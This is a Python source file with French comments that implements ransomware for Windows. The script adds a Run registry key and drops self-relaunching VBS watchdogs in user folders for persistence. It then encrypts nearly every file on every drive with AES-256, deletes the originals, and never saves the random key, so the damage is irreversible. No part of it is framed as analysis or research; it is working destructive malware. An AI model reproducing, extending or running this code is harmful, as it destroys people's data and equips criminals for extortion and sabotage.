import os
import string
from pathlib import Path
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import multiprocessing
import winreg
import time
import subprocess


vbs_content = r'''
Set WshShell = CreateObject("WScript.Shell")
Set WMI = GetObject("winmgmts:\\.\root\cimv2")

pythonProcessName = "pythonw.exe"  ' ou python.exe si tu préfères
scriptPath = "{}"  ' chemin complet vers ton script python

Do
    procCount = 0
    Set processes = WMI.ExecQuery("Select * from Win32_Process Where Name='" & pythonProcessName & "'")
    For Each process In processes
        If InStr(LCase(process.CommandLine), LCase(scriptPath)) > 0 Then
            procCount = procCount + 1
        End If
    Next

    If procCount = 0 Then
        WshShell.Run "pythonw.exe """ & scriptPath & """", 0, False
    End If

    WScript.Sleep 5000
Loop
'''

# Clé et IV pour AES-256 CBC
key = os.urandom(32)  # 256 bits
iv = os.urandom(16)   # 128 bits

# Extensions de fichiers à exclure
extensions_exclues = (".exe", ".dll", ".sys", ".bat", ".com", ".tmp")

# Dossiers à exclure (en minuscules)
folders_exclus = [
    "windows",
    "program files",
    "program files (x86)",
    "system volume information",
    "$recycle.bin",
    ".git",
    "boot",
    "temp",
    "tmp",
    "cache",
    "appdata",
    "local",
    "microsoft",
    "programdata",
    ".vscode"
]

max_size = 100 * 1024 * 1024  # 100 Mo max

script_python_path = os.path.abspath(__file__)

target_dirs = [
    os.getenv("TEMP"),
    os.getenv("APPDATA"),
    os.path.expandvars(r"%USERPROFILE%\Documents"),
    os.path.expandvars(r"%USERPROFILE%\Desktop"),
]

def create_watchdog_vbs(script_python_path, target_dirs):
    for folder in target_dirs:
        try:
            if not os.path.exists(folder):
                os.makedirs(folder)
            vbs_path = os.path.join(folder, "watchdog.vbs")
            with open(vbs_path, "w", encoding="utf-8") as f:
                f.write(vbs_content.format(script_python_path.replace("\\", "\\\\")))
            print(f"[+] Watchdog créé dans {vbs_path}")
        except Exception as e:
            print(f"[!] Erreur création watchdog dans {folder}: {e}")

def lancer_watchdogs(dirs):
    for folder in dirs:
        vbs_path = os.path.join(folder, "watchdog.vbs")
        if os.path.exists(vbs_path):
            subprocess.Popen(["wscript.exe", vbs_path], shell=False)

def ajouter_run_key():
    try:
        nom_valeur = "MonScriptAuto"
        chemin_script = os.path.join(os.path.dirname(os.path.realpath(__file__)), "monScript.vbs")

        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, nom_valeur, 0, winreg.REG_SZ, chemin_script)
        winreg.CloseKey(key)
        print("[+] Ajouté au démarrage avec Run Key.")
    except Exception as e:
        print(f"[!] Erreur ajout Run Key : {e}")

def is_in_excluded_folder(file_path: Path):
    try:
        path_parts = [part.lower() for part in file_path.resolve().parts]
        for exclu in folders_exclus:
            for part in path_parts:
                if exclu in part:
                    return True
        return False
    except Exception as e:
        print(f"[!] Erreur exclusion sur {file_path}: {e}")
        return True  

def get_existing_root_path():
    root_paths = []
    for letter in string.ascii_uppercase:
        drive = f"{letter}:/"
        if Path(drive).exists():
            root_paths.append(drive)
    return root_paths

def encrypte_file(input_file):
    backend = default_backend()
    with open(input_file, 'rb') as f:
        data = f.read()

    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(data) + padder.finalize()

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
    encryptor = cipher.encryptor()
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

    output_file = input_file + ".tmp"

    with open(output_file, 'wb') as f:
        f.write(iv + encrypted_data)

    os.remove(input_file)
    print(f"[✓] Fichier chiffré : {input_file}")
    return True

# --- Nouveau : worker consommateur qui lit dans queue ---
def worker(queue):
    while True:
        file = queue.get()
        if file is None:  # signal fin
            break
        try:
            if is_in_excluded_folder(file):
                continue
            if file.is_file() and file.suffix.lower() not in extensions_exclues and file.stat().st_size < max_size:
                encrypte_file(str(file))
        except Exception as e:
            print(f"[!] Erreur sur {file}: {e}")

# --- Nouvelle version optimisée ---
def process_par_lecteur(chemin, nb_process=5):
    chemin = Path(chemin)
    queue = multiprocessing.Queue(maxsize=100)  # limite la mémoire utilisée

    # Démarrage workers
    processus = []
    for _ in range(nb_process):
        p = multiprocessing.Process(target=worker, args=(queue,))
        p.start()
        processus.append(p)

    # Producteur : ajoute fichiers dans la queue
    for file in chemin.rglob("*"):
        try:
            queue.put(file)
        except Exception as e:
            print(f"[!] Erreur ajout fichier à la queue: {e}")

    # Envoie signal fin aux workers
    for _ in range(nb_process):
        queue.put(None)

    # Attend fin des workers
    for p in processus:
        p.join()

def main():
    ajouter_run_key()
    create_watchdog_vbs(script_python_path, target_dirs)
    lancer_watchdogs(target_dirs)
    lecteurs = get_existing_root_path()
    processus_lecteurs = []

    for lecteur in lecteurs:
        p = multiprocessing.Process(target=process_par_lecteur, args=(lecteur,))
        p.start()
        processus_lecteurs.append(p)

    for p in processus_lecteurs:
        p.join()

if __name__ == "__main__":
    multiprocessing.freeze_support()
    main()
